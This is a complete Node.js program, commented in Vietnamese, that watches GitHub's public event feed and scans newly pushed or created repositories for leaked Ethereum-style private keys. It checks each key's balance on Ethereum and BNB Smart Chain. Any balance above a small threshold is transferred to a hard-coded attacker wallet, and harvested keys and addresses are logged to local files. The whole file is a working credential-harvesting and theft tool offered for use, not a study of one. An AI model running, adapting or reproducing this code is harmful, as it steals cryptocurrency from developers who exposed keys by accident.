const fs = require('fs');
const fetch = require('node-fetch');
const { ethers } = require('ethers');
const chalk = require('chalk');

// ===== KHAI BÁO TOÀN CỤC =====

// Cấu hình
const config = {
  // Token xác thực GitHub API
  GITHUB_TOKEN: '',
  
  // Thời gian giữa các lần quét (30 giây)
  CHECK_INTERVAL: 30000,
  
  // File lưu các private key tìm thấy
  LOG_FILE: 'found_keys.txt',
  
  // URL API GitHub Events
  EVENTS_URL: 'https://api.github.com/events',
  
  // Địa chỉ ví đích để chuyển tiền
  DEST_ADDRESS: '0x8b791c25285d84Aca210624FE86FcB84ed7E8Fb1',
  
  // Số dư tối thiểu để thực hiện chuyển tiền (0.005 ETH)
  MIN_AMOUNT: 0.005,
  
  // Chế độ quét:
  // - 'all': Quét tất cả sự kiện (PushEvent và CreateEvent)
  // - 'push': Chỉ quét các PushEvent (commit mới)
  // - 'create': Chỉ quét các CreateEvent (repo mới)
  // - 'balance': Chỉ kiểm tra số dư các key đã tìm thấy
  SCAN_MODE: 'all',
  
  // Số lượng kiểm tra số dư đồng thời tối đa
  BALANCE_CHECK_CONCURRENCY: 20,
  
  // File lưu các event đã xử lý
  SEEN_EVENTS_FILE: 'seen_events.json',
  
  // File cache ETag để tối ưu request API
  ETAG_CACHE_FILE: 'etag_cache.json',
  
  // File xuất danh sách ví có số dư
  BALANCE_OUTPUT_FILE: 'wallets_with_balance.txt',
  
  // Số lượng file tối đa quét trong mỗi repo
  MAX_FILES_PER_REPO: 100,
  
  // Trạng thái file cần quét trong commit
  SCAN_FILE_STATUS: ['added', 'removed', 'modified'],
};

const HEADERS = config.GITHUB_TOKEN ? { 'Authorization': `token ${config.GITHUB_TOKEN}` } : {};
const regexes = [
  /\b0x[a-fA-F0-9]{64}\b/g,
  /\b[a-fA-F0-9]{64}\b/g
];
let seenEventIds = new Set();
let workingRpcUrls = {};
let rpcIndex = {};
let rpcResponseTime = {};
const CODE_FILE_EXTENSIONS = [
  '.js', '.ts', '.py', '.sol', '.env', '.json', '.yaml', '.yml', '.txt', '.go', '.rs', '.c', '.cpp', '.h', '.java', '.php', '.sh', '.pl', '.rb', '.swift', '.cs', '.ini', '.cfg', '.md', '.toml', '.lock', '.conf', '.bat', '.ps1', '.dockerfile', '.makefile', '.gradle', '.xml', '.html', '.css', '.scss', '.vue', '.svelte', '.jsx', '.tsx', '.dart', '.kt', '.m', '.mm', '.scala', '.groovy', '.properties', '.pem', '.crt', '.key', '.secret', '.config', '.sample', '.example'
];
let foundKeySet = new Set();
let etagCache = {};
let dynamicDelay = config.CHECK_INTERVAL;
let lastSeenEventId = null;
const networkRpcUrls = {
  'Ethereum': [
    'https://eth.llamarpc.com',
    'https://eth-mainnet.nodereal.io/v1/1659dfb40aa24bbb8153a677b98064d7',
    'https://eth-mainnet.public.blastapi.io',
    'https://api.zan.top/eth-mainnet',
    'https://ethereum.blockpi.network/v1/rpc/public',
    'https://eth.rpc.blxrbdn.com',
    'wss://eth.drpc.org',
    'https://ethereum-rpc.publicnode.com',
    'https://eth.drpc.org',
    'https://uk.rpc.blxrbdn.com',
    'https://0xrpc.io/eth',
    'https://eth.blockrazor.xyz',
    'wss://ethereum-rpc.publicnode.com',
    'https://singapore.rpc.blxrbdn.com',
    'https://virginia.rpc.blxrbdn.com',
    'https://mainnet.gateway.tenderly.co',
    'https://1rpc.io/eth',
    'https://gateway.tenderly.co/public/mainnet',
    'https://go.getblock.io/aefd01aa907c4805ba3c00a9e5b48c6b',
    'https://eth-pokt.nodies.app'
  ],
  'BNB Smart Chain': [
    'https://binance.llamarpc.com',
    'wss://bsc-rpc.publicnode.com',
    'wss://0xrpc.io/bnb',
    'https://bsc.rpc.blxrbdn.com',
    'https://bsc.drpc.org',
    'https://bnb.api.onfinality.io/public',
    'https://0xrpc.io/bnb',
    'https://bsc.blockrazor.xyz',
    'https://bsc-pokt.nodies.app',
    'https://go.getblock.io/cc778cdbdf5c4b028ec9456e0e6c0cf3',
    'https://0.48.club',
    'https://rpc-bsc.48.club',
    'https://bsc-mainnet.rpcfast.com?api_key=xbhWBI1Wkguk8SNMu1bvvLurPGLXmgwYeC4S6g2H7WdwFigZSmPWVZRxrskEQwIf',
  ]
};
const networks = [
  { name: 'Ethereum', symbol: 'ETH' },
  { name: 'BNB Smart Chain', symbol: 'BNB' }
];
const balanceOutputFile = config.BALANCE_OUTPUT_FILE;
const POPULAR_DIRS = [
  'src', 'contracts', 'config', 'lib', 'app', 'backend', 'server', 'api', 'env', 'settings', 'deploy', 'migrations', 'test', 'examples', 'samples', 'utils', 'core', 'main', 'public', 'private', 'secrets', 'keys', 'wallets'
];

// Tối ưu 2: Đọc log vào Set khi khởi động
try {
  const logContent = fs.readFileSync(config.LOG_FILE, 'utf8');
  const regex = /0x[a-fA-F0-9]{64}|\b[a-fA-F0-9]{64}\b/g;
  const matches = logContent.match(regex) || [];
  foundKeySet = new Set(matches);
} catch (e) {}

// Tối ưu 3: Lưu seenEventIds vào file
try {
  if (fs.existsSync(config.SEEN_EVENTS_FILE)) {
    const seenRaw = fs.readFileSync(config.SEEN_EVENTS_FILE, 'utf8');
    seenEventIds = new Set(JSON.parse(seenRaw));
  }
} catch (e) {}

function saveSeenEvents() {
  try {
    fs.writeFileSync(config.SEEN_EVENTS_FILE, JSON.stringify(Array.from(seenEventIds)));
  } catch (e) {}
}

function extractKeys(content) {
  let found = [];
  for (const regex of regexes) {
    const matches = content.match(regex);
    if (matches) found = found.concat(matches);
  }
  return found;
}

// Tối ưu 8: Cache ETag/Last-Modified cho từng URL
try {
  if (fs.existsSync(config.ETAG_CACHE_FILE)) {
    etagCache = JSON.parse(fs.readFileSync(config.ETAG_CACHE_FILE, 'utf8'));
  }
} catch (e) {}
function saveEtagCache() {
  try {
    fs.writeFileSync(config.ETAG_CACHE_FILE, JSON.stringify(etagCache));
  } catch (e) {}
}

// Hàm fetch với ETag/If-Modified-Since và tự động tăng delay nếu bị rate limit
async function fetchWithCache(url) {
  let headers = { ...HEADERS };
  if (etagCache[url]) {
    if (etagCache[url].etag) headers['If-None-Match'] = etagCache[url].etag;
    if (etagCache[url]['last-modified']) headers['If-Modified-Since'] = etagCache[url]['last-modified'];
  }
  const res = await fetch(url, { headers });
  // Xử lý rate limit
  if (res.status === 403 && res.headers.get('X-RateLimit-Remaining') === '0') {
    const reset = res.headers.get('X-RateLimit-Reset');
    const now = Math.floor(Date.now() / 1000);
    const waitSec = reset ? Math.max(0, parseInt(reset) - now) : 60;
    dynamicDelay = Math.max(dynamicDelay, (waitSec + 5) * 1000);
    console.log(chalk.red(`Rate limit! Tăng thời gian quét lên ${dynamicDelay / 1000}s`));
    throw new Error('Rate limit');
  }
  if (res.status === 304) {
    // Không thay đổi, trả về null
    return null;
  }
  // Lưu ETag/Last-Modified nếu có
  const etag = res.headers.get('etag');
  const lastModified = res.headers.get('last-modified');
  if (etag || lastModified) {
    etagCache[url] = etagCache[url] || {};
    if (etag) etagCache[url].etag = etag;
    if (lastModified) etagCache[url]['last-modified'] = lastModified;
    saveEtagCache();
  }
  return res;
}

// Sửa fetchJSON để dùng fetchWithCache
async function fetchJSON(url) {
  let res;
  try {
    res = await fetchWithCache(url);
  } catch (e) {
    if (e.message === 'Rate limit') throw e;
    throw new Error(`HTTP error: ${url}`);
  }
  if (!res) return null; // 304 Not Modified
  if (!res.ok) throw new Error(`HTTP ${res.status}: ${url}`);
  return res.json();
}

// Thêm biến lưu event ID cuối cùng đã xử lý
try {
  if (fs.existsSync('last_seen_event_id.txt')) {
    lastSeenEventId = fs.readFileSync('last_seen_event_id.txt', 'utf8').trim();
  }
} catch (e) {}

// Hàm chính để quét các sự kiện GitHub
async function scan() {
  try {
    // Lấy danh sách các sự kiện từ API GitHub
    const events = await fetchJSON(config.EVENTS_URL);
    let newEvents = [];

    // Lọc ra các sự kiện mới chưa xử lý
    for (const event of events) {
      if (event.id === lastSeenEventId) break;
      newEvents.push(event);
    }

    // Xử lý các sự kiện từ cũ đến mới để đảm bảo đúng thứ tự thời gian
    for (let i = newEvents.length - 1; i >= 0; i--) {
      const event = newEvents[i];

      // Bỏ qua nếu đã xử lý sự kiện này rồi
      if (seenEventIds.has(event.id)) continue;
      seenEventIds.add(event.id);
      saveSeenEvents();

      // Xử lý sự kiện push commit nếu cấu hình cho phép
      if ((config.SCAN_MODE === 'commit' || config.SCAN_MODE === 'all') && event.type === 'PushEvent') {
        const repo = event.repo.name;
        const commits = event.payload.commits || [];

        // Duyệt qua từng commit trong push
        for (const commit of commits) {
          const sha = commit.sha;
          
          // Lấy thông tin chi tiết của commit để biết các file thay đổi
          const commitUrl = `https://api.github.com/repos/${repo}/commits/${sha}`;
          let commitData;
          try {
            commitData = await fetchJSON(commitUrl);
          } catch (e) { continue; }

          // Duyệt qua các file bị thay đổi trong commit
          const files = commitData.files || [];
          for (const file of files) {
            // Kiểm tra trạng thái và định dạng file
            if (!config.SCAN_FILE_STATUS.includes(file.status)) continue;
            if (!file.filename || !file.raw_url) continue; 
            if (!isCodeFile(file.filename)) continue; // Chỉ quét file code

            // Lấy nội dung file
            let content;
            try {
              const res = await fetch(file.raw_url, { headers: HEADERS });
              if (!res.ok) continue;
              content = await res.text();
            } catch (e) { continue; }

            // Tìm các private key trong nội dung file
            const keys = extractKeys(content);
            if (keys.length > 0) {
              // Xử lý từng key tìm được
              for (const key of keys) {
                // Kiểm tra key có hợp lệ không
                if (!isLikelyEvmPrivateKey(key)) {
                  console.log(chalk.red(`Bỏ qua key không hợp lệ: ${key}`));
                  continue;
                }

                // Chuẩn hóa private key
                let pk = key.trim();
                if (!pk.startsWith('0x')) pk = '0x' + pk;

                // Bỏ qua nếu đã tìm thấy key này rồi
                if (foundKeySet.has(pk)) {
                  console.log(chalk.yellow(`Key đã tồn tại, bỏ qua: ${key}`));
                  continue;
                }

                try {
                  // Tạo ví từ private key
                  const wallet = new ethers.Wallet(pk);
                  let totalBalance = 0;
                  let networkBalances = [];

                  // Kiểm tra số dư trên các mạng
                  for (const network of networks) {
                    const provider = await getWorkingProvider(network.name);
                    if (!provider) {
                      console.log(chalk.red(`Tất cả RPC của mạng ${network.name} đều lỗi, bỏ qua.`));
                      continue;
                    }

                    // Lấy số dư và chuyển đổi sang ETH
                    const balance = await provider.getBalance(wallet.address);
                    const balanceInEth = ethers.formatEther(balance);
                    networkBalances.push({ network: network.name, symbol: network.symbol, balance: balanceInEth });
                    totalBalance += parseFloat(balanceInEth);

                    // Nếu số dư lớn hơn ngưỡng thì chuyển hết về ví đích
                    if (parseFloat(balanceInEth) > config.MIN_AMOUNT) {
                      const txHash = await sendAllFunds(pk, network, config.DEST_ADDRESS);
                      if (txHash) {
                        const logTx = `Đã chuyển toàn bộ ${balanceInEth} ${network.symbol} từ ${wallet.address} về ${config.DEST_ADDRESS} trên mạng ${network.name}. Tx: ${txHash}\n`;
                        fs.appendFileSync(config.LOG_FILE, logTx);
                        console.log(chalk.green(logTx));
                      } else {
                        console.log(chalk.red(`Không thể chuyển ${network.symbol} từ ${wallet.address} trên mạng ${network.name} (có thể không đủ phí gas).`));
                      }
                    }
                    await new Promise(resolve => setTimeout(resolve, 500));
                  }

                  // Nếu có số dư thì ghi log
                  if (totalBalance > 0) {
                    const githubUrl = `https://github.com/${repo}/blob/${sha}/${file.filename}`;
                    const logEntry = `Repo: ${repo}\nFile: ${file.filename}\nLink: ${githubUrl}\nKey: ${key}\nAddress: ${wallet.address}\nTổng số dư: ${totalBalance} ETH\nSố dư trên các mạng:\n` +
                      networkBalances.map(b => `${b.network}: ${b.balance} ${b.symbol}`).join('\n') +
                      `\nCommit: ${sha}\n---\n`;
                    fs.appendFileSync(config.LOG_FILE, logEntry);
                    foundKeySet.add(pk); // Cập nhật Set các key đã tìm thấy
                    console.log(chalk.blue(`Found key with balance in ${repo}/${file.filename}: ${key} ${wallet.address} ${totalBalance}`));
                  } else {
                    console.log(chalk.yellow(`Key không có số dư: ${key}`));
                  }
                } catch (e) {
                  console.log(chalk.red(`Key không hợp lệ: ${key}`));
                }
              }
            }
          }
        }
      }

      // Xử lý sự kiện tạo repo mới nếu cấu hình cho phép
      if ((config.SCAN_MODE === 'new-repo' || config.SCAN_MODE === 'all') && event.type === 'CreateEvent' && event.payload.ref_type === 'repository') {
        const repo = event.repo.name;
        const contentsUrl = `https://api.github.com/repos/${repo}/contents`;

        // Lấy danh sách tất cả các file trong repo
        let files = await getAllFilesInRepo(contentsUrl);
        for (const file of files) {
          if (!file.download_url) continue;
          if (!isCodeFile(file.name || file.path || '')) continue; // Chỉ quét file code

          // Lấy nội dung file
          let content;
          try {
            const res = await fetch(file.download_url, { headers: HEADERS });
            if (!res.ok) continue;
            content = await res.text();
          } catch (e) { continue; }

          // Tìm các private key trong nội dung file
          const keys = extractKeys(content);
          if (keys.length > 0) {
            // Xử lý từng key tìm được
            for (const key of keys) {
              if (!isLikelyEvmPrivateKey(key)) {
                console.log(chalk.red(`Bỏ qua key không hợp lệ: ${key}`));
                continue;
              }

              // Chuẩn hóa private key
              let pk = key.trim();
              if (!pk.startsWith('0x')) pk = '0x' + pk;

              // Bỏ qua nếu đã tìm thấy key này rồi
              if (foundKeySet.has(pk)) {
                console.log(chalk.yellow(`Key đã tồn tại, bỏ qua: ${key}`));
                continue;
              }

              try {
                // Tạo ví từ private key
                const wallet = new ethers.Wallet(pk);
                let totalBalance = 0;
                let networkBalances = [];

                // Kiểm tra số dư trên các mạng
                for (const network of networks) {
                  const provider = await getWorkingProvider(network.name);
                  if (!provider) {
                    console.log(chalk.red(`Tất cả RPC của mạng ${network.name} đều lỗi, bỏ qua.`));
                    continue;
                  }

                  // Lấy số dư và chuyển đổi sang ETH
                  const balance = await provider.getBalance(wallet.address);
                  const balanceInEth = ethers.formatEther(balance);
                  networkBalances.push({ network: network.name, symbol: network.symbol, balance: balanceInEth });
                  totalBalance += parseFloat(balanceInEth);

                  // Nếu số dư lớn hơn ngưỡng thì chuyển hết về ví đích
                  if (parseFloat(balanceInEth) > config.MIN_AMOUNT) {
                    const txHash = await sendAllFunds(pk, network, config.DEST_ADDRESS);
                    if (txHash) {
                      const logTx = `Đã chuyển toàn bộ ${balanceInEth} ${network.symbol} từ ${wallet.address} về ${config.DEST_ADDRESS} trên mạng ${network.name}. Tx: ${txHash}\n`;
                      fs.appendFileSync(config.LOG_FILE, logTx);
                      console.log(chalk.green(logTx));
                    } else {
                      console.log(chalk.red(`Không thể chuyển ${network.symbol} từ ${wallet.address} trên mạng ${network.name} (có thể không đủ phí gas).`));
                    }
                  }
                  await new Promise(resolve => setTimeout(resolve, 500));
                }

                // Nếu có số dư thì ghi log
                if (totalBalance > 0) {
                  const githubUrl = `https://github.com/${repo}/blob/main/${file.path}`;
                  const logEntry = `Repo: ${repo}\nFile: ${file.path}\nLink: ${githubUrl}\nKey: ${key}\nAddress: ${wallet.address}\nTổng số dư: ${totalBalance} ETH\nSố dư trên các mạng:\n` +
                    networkBalances.map(b => `${b.network}: ${b.balance} ${b.symbol}`).join('\n') +
                    `\nCommit: (new repo)\n---\n`;
                  fs.appendFileSync(config.LOG_FILE, logEntry);
                  foundKeySet.add(pk); // Cập nhật Set các key đã tìm thấy
                  console.log(chalk.blue(`Found key with balance in NEW repo ${repo}/${file.path}: ${key} ${wallet.address} ${totalBalance}`));
                } else {
                  console.log(chalk.yellow(`Key không có số dư: ${key}`));
                }
              } catch (e) {
                console.log(chalk.red(`Key không hợp lệ: ${key}`));
              }
            }
          }
        }
      }
    }

    // Cập nhật ID sự kiện cuối cùng đã xử lý
    if (events && events.length > 0) {
      lastSeenEventId = events[0].id;
      fs.writeFileSync('last_seen_event_id.txt', lastSeenEventId);
    }
  } catch (err) {
    console.error('Error during scan:', err);
  }
}

// Hàm kiểm tra file có phải code/text không
function isCodeFile(filename) {
  const lower = filename.toLowerCase();
  return CODE_FILE_EXTENSIONS.some(ext => lower.endsWith(ext));
}

// Hàm tạo provider hỗ trợ cả HTTP(S) và WSS
function createProvider(url) {
  if (url.startsWith('wss://')) {
    return new ethers.WebSocketProvider(url);
  } else {
    return new ethers.JsonRpcProvider(url);
  }
}

async function checkNetworkBalance(wallet, network) {
    try {
        const provider = createProvider(networkRpcUrls[network.name][0]);
        const balance = await provider.getBalance(wallet.address);
        const balanceInEth = ethers.formatEther(balance);
        // Nếu là WebSocketProvider, đóng sau khi dùng xong
        if (provider instanceof ethers.WebSocketProvider && provider.destroy) {
          await provider.destroy();
        }
        return {
            network: network.name,
            symbol: network.symbol,
            balance: balanceInEth
        };
    } catch (error) {
        return {
            network: network.name,
            symbol: network.symbol,
            balance: '0'
        };
    }
}

async function checkWalletBalance(privateKey) {
    try {
        // Chuẩn hóa private key
        let pk = privateKey.trim();
        if (pk.startsWith('0x')) pk = pk;
        else pk = '0x' + pk;
        const wallet = new ethers.Wallet(pk);
        // Kiểm tra số dư trên tất cả các mạng song song
        let networkBalances = await Promise.all(
            networks.map(network => checkNetworkBalance(wallet, network))
        );
        let totalBalance = networkBalances.reduce((sum, b) => sum + parseFloat(b.balance), 0);
        if (totalBalance > 0) {
            return {
                address: wallet.address,
                privateKey: pk,
                totalBalance: totalBalance,
                networkBalances: networkBalances
            };
        }
        return null;
    } catch (error) {
        return null;
    }
}

function extractAllKeysFromFoundFile() {
    const content = fs.readFileSync(config.LOG_FILE, 'utf8');
    // Regex lấy cả 0x + 64 hex và 64 hex
    const regex = /0x[a-fA-F0-9]{64}|\b[a-fA-F0-9]{64}\b/g;
    const matches = content.match(regex) || [];
    // Loại trùng lặp
    return Array.from(new Set(matches));
}

async function checkAllKeysBalance() {
    const keys = extractAllKeysFromFoundFile();
    console.log(`Tìm thấy ${keys.length} private key, bắt đầu kiểm tra số dư...`);
    let found = 0;
    let running = 0;
    let next = 0;
    const results = [];
    function runNext(resolve) {
        while (running < config.BALANCE_CHECK_CONCURRENCY && next < keys.length) {
            const key = keys[next];
            running++;
            (async (idx, k) => {
                const walletInfo = await checkWalletBalance(k);
                if (walletInfo) {
                    found++;
                    results.push(walletInfo); // Lưu vào mảng thay vì ghi file ngay
                    console.log(chalk.green(`[${found}] Ví có số dư: ${walletInfo.address} - ${walletInfo.totalBalance} ETH`));
                } else {
                    console.log(chalk.yellow(`[${idx+1}/${keys.length}] Không có số dư: ${k}`));
                }
                running--;
                if (next < keys.length) {
                    runNext(resolve);
                } else if (running === 0) {
                    resolve();
                }
            })(next, key);
            next++;
        }
    }
    await new Promise(runNext);

    // Sắp xếp kết quả theo tổng số dư giảm dần
    results.sort((a, b) => b.totalBalance - a.totalBalance);

    // Ghi ra file (xóa file cũ trước)
    fs.writeFileSync(balanceOutputFile, '');
    for (const walletInfo of results) {
        let data = `Địa chỉ: ${walletInfo.address}\n`;
        data += `Private Key: ${walletInfo.privateKey}\n`;
        data += `Tổng số dư: ${walletInfo.totalBalance} ETH\n\n`;
        data += 'Số dư trên các mạng:\n';
        walletInfo.networkBalances.forEach(balance => {
            data += `${balance.network}: ${balance.balance} ${balance.symbol}\n`;
        });
        data += '\n----------------------------------------\n\n';
        fs.appendFileSync(balanceOutputFile, data);
    }

    console.log(`\nHoàn thành. Đã tìm thấy ${found} ví có số dư.`);
}

// Nếu chạy với tham số 'check-balance' thì thực hiện kiểm tra số dư
if (process.argv[2] === 'check-balance') {
    checkAllKeysBalance();
    return;
}

function isLikelyEvmPrivateKey(key) {
  // Loại bỏ toàn 0 hoặc toàn f
  if (/^0x?0{64}$/i.test(key) || /^0x?f{64}$/i.test(key)) return false;
  try {
    new ethers.Wallet(key.startsWith('0x') ? key : '0x' + key);
    return true;
  } catch {
    return false;
  }
}

// Hàm đệ quy lấy tất cả file trong repo (chỉ đi vào thư mục phổ biến, giới hạn số file)
async function getAllFilesInRepo(contentsUrl, fileList = [], depth = 0) {
  if (fileList.length >= config.MAX_FILES_PER_REPO) return fileList;
  let items;
  try {
    items = await fetchJSON(contentsUrl);
  } catch (e) { return fileList; }
  for (const item of items) {
    if (fileList.length >= config.MAX_FILES_PER_REPO) break;
    if (item.type === 'file' && item.download_url) {
      fileList.push(item);
    } else if (item.type === 'dir') {
      // Chỉ đi vào thư mục phổ biến hoặc ở depth 0 (tức là thư mục gốc)
      if (depth === 0 || POPULAR_DIRS.includes(item.name.toLowerCase())) {
        await getAllFilesInRepo(item.url, fileList, depth + 1);
      }
    }
  }
  return fileList;
}

// Hàm gửi toàn bộ số dư về ví đích
async function sendAllFunds(privateKey, network, toAddress) {
  try {
    const provider = await getWorkingProvider(network.name);
    if (!provider) return null;
    const wallet = new ethers.Wallet(privateKey, provider);
    const balance = await provider.getBalance(wallet.address);
    // Lấy gas price
    const gasPrice = await provider.getGasPrice();
    // Ước lượng gas limit (gửi đơn giản là 21000)
    const gasLimit = 21000n;
    // Số dư thực tế có thể gửi
    const totalFee = gasPrice * gasLimit;
    if (balance <= totalFee) return null;
    const amountToSend = balance - totalFee;
    if (amountToSend <= 0) return null;
    const tx = await wallet.sendTransaction({
      to: toAddress,
      value: amountToSend,
      gasPrice: gasPrice,
      gasLimit: gasLimit
    });
    await tx.wait();
    return tx.hash;
  } catch (e) {
    return null;
  }
}

// Hàm kiểm tra và lọc các RPC khả dụng cho từng mạng, đồng thời đo thời gian phản hồi
async function filterWorkingRpcs() {
  for (const networkName of Object.keys(networkRpcUrls)) {
    workingRpcUrls[networkName] = [];
    rpcResponseTime[networkName] = {};

    const urls = networkRpcUrls[networkName];
    const checkPromises = urls.map(async (url) => {
      try {
        const provider = createProvider(url);
        const start = Date.now();
        await provider.getBlockNumber(); // test kết nối
        const elapsed = Date.now() - start;
        workingRpcUrls[networkName].push(url);
        rpcResponseTime[networkName][url] = elapsed;
        if (provider instanceof ethers.WebSocketProvider && provider.destroy) {
          await provider.destroy();
        }
        console.log(`✔️  RPC OK: ${networkName} - ${url} (${elapsed} ms)`);
      } catch (e) {
        console.log(`❌ RPC lỗi: ${networkName} - ${url}`);
      }
    });

    await Promise.all(checkPromises);

    if (workingRpcUrls[networkName].length === 0) {
      console.log(chalk.red(`Không có RPC nào khả dụng cho mạng ${networkName}!`));
    }
  }
}

let rpcRoundRobinIndex = {};

function getNextRpcUrl(networkName) {
  if (!workingRpcUrls[networkName] || workingRpcUrls[networkName].length === 0) return null;
  if (typeof rpcRoundRobinIndex[networkName] !== 'number') rpcRoundRobinIndex[networkName] = 0;
  const urls = workingRpcUrls[networkName];
  const idx = rpcRoundRobinIndex[networkName];
  rpcRoundRobinIndex[networkName] = (idx + 1) % urls.length;
  return urls[idx];
}

// Sửa hàm getWorkingProvider để dùng round-robin
async function getWorkingProvider(networkName) {
  const url = getNextRpcUrl(networkName);
  if (!url) return null;
  try {
    const provider = createProvider(url);
    // Có thể kiểm tra provider ở đây nếu muốn
    return provider;
  } catch {
    return null;
  }
}

console.log('Starting GitHub public event watcher...');
filterWorkingRpcs().then(() => {
  setInterval(scan, dynamicDelay);
});
// Định kỳ 30s kiểm tra lại RPC
setInterval(() => {
  console.log('Đang kiểm tra lại danh sách RPC...');
  filterWorkingRpcs();
}, 30000); 
